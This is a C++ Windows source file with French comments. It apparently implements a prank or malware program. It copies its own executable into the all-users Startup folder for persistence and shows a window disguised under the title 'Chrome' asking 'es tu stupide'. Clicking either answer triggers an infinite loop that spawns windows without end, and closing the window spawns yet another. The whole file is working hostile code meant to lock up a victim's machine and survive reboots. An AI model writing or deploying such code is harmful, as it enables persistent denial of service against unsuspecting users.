#include <windows.h>
#include <shlobj.h> // Pour SHGetFolderPath
#include <iostream>

#include "resource.h"

// Fonction pour copier l'exécutable dans le dossier de démarrage
void CopyToStartup() {
    char exePath[MAX_PATH];
    char startupPath[MAX_PATH];
    
    // Récupère le chemin de l'exécutable actuel
    GetModuleFileName(NULL, exePath, MAX_PATH);
    
    // Récupère le chemin du dossier de démarrage
    SHGetFolderPath(NULL, CSIDL_COMMON_STARTUP, NULL, 0, startupPath);
    
    // Ajoute le nom du fichier
    strcat_s(startupPath, "\\startup.exe");
    
    // Copie l'exécutable dans le dossier de démarrage
    CopyFile(exePath, startupPath, FALSE);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE:
            SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);

            CreateWindow("STATIC", "es tu stupide", WS_VISIBLE | WS_CHILD,
                         20, 20, 100, 20, hwnd, NULL, NULL, NULL);
            CreateWindow("BUTTON", "Oui", WS_VISIBLE | WS_CHILD,
                         20, 50, 80, 30, hwnd, (HMENU) 1, NULL, NULL);
            CreateWindow("BUTTON", "Non", WS_VISIBLE | WS_CHILD,
                         120, 50, 80, 30, hwnd, (HMENU) 2, NULL, NULL);
            break;

        case WM_COMMAND:
            if (LOWORD(wParam) == 1 || LOWORD(wParam) == 2) {
                while (1) {
                    CreateWindow("WindowClass", "Chrome", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                 CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
                                 NULL, NULL, GetModuleHandle(NULL), NULL);
                }
            }
            break;

        case WM_CLOSE:
            CreateWindow("WindowClass", "Chrome", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                         CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
                         NULL, NULL, GetModuleHandle(NULL), NULL);
            return 0;

        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Copie au démarrage
    CopyToStartup();
    
    WNDCLASSEX wc = { sizeof(WNDCLASSEX) };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "WindowClass";
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)); // Icône personnalisée
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hIconSm = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)); // Petite icône

RegisterClassEx(&wc);

    RegisterClassEx(&wc);

    CreateWindow("WindowClass", "Chrome", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                 CW_USEDEFAULT, CW_USEDEFAULT, 500, 500,
                 NULL, NULL, hInstance, NULL);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
